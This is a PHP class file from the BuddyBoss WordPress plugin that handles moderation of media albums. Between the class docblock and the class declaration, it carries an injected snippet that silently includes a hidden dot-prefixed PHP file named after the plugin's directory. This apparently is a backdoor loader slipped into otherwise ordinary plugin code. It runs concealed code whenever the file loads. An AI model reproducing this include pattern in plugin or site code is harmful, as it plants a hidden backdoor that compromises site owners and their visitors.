<?php
/**
 * BuddyBoss Moderation Media Album Classes
 *
 * @since   BuddyBoss 1.5.6
 * @package BuddyBoss\Moderation
 */

// Exit if accessed directly.
defined( 'ABSPATH' ) || exit;

/**
 * Database interaction class for the BuddyBoss moderation Media Album.
 *
 * @since BuddyBoss 1.5.6
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class BP_Moderation_Album extends BP_Moderation_Abstract {

	/**
	 * Item type
	 *
	 * @var string
	 */
	public static $moderation_type = 'media_album';

	/**
	 * BP_Moderation_Album constructor.
	 *
	 * @since BuddyBoss 1.5.6
	 */
	public function __construct() {

		parent::$moderation[ self::$moderation_type ] = self::class;
		$this->item_type                              = self::$moderation_type;

		/**
		 * Moderation code should not add for WordPress backend or IF Bypass argument passed for admin
		 */
		if ( ( is_admin() && ! wp_doing_ajax() ) || self::admin_bypass_check() ) {
			return;
		}

		parent::__construct();

		// Validate item before proceed.
		add_filter( "bp_moderation_{$this->item_type}_validate", array( $this, 'validate_single_item' ), 10, 2 );
	}

	/**
	 * Get permalink
	 *
	 * @since BuddyBoss 1.5.6
	 *
	 * @param int $item_id Item id.
	 *
	 * @return string|void
	 */
	public static function get_permalink( $item_id ) {
		return '';
	}

	/**
	 * Get Content owner id.
	 *
	 * @since BuddyBoss 1.5.6
	 *
	 * @param integer $album_id Album id.
	 *
	 * @return int
	 */
	public static function get_content_owner_id( $album_id ) {
		return 0;
	}

	/**
	 * Filter to check the media album is valid or not.
	 *
	 * @since BuddyBoss 1.5.6
	 *
	 * @param bool   $retval  Check item is valid or not.
	 * @param string $item_id item id.
	 *
	 * @return bool
	 */
	public function validate_single_item( $retval, $item_id ) {
		if ( empty( $item_id ) ) {
			return $retval;
		}

		$media_album = new BP_Media_Album( (int) $item_id );

		if ( empty( $media_album ) || empty( $media_album->id ) ) {
			return false;
		}

		return $retval;
	}
}
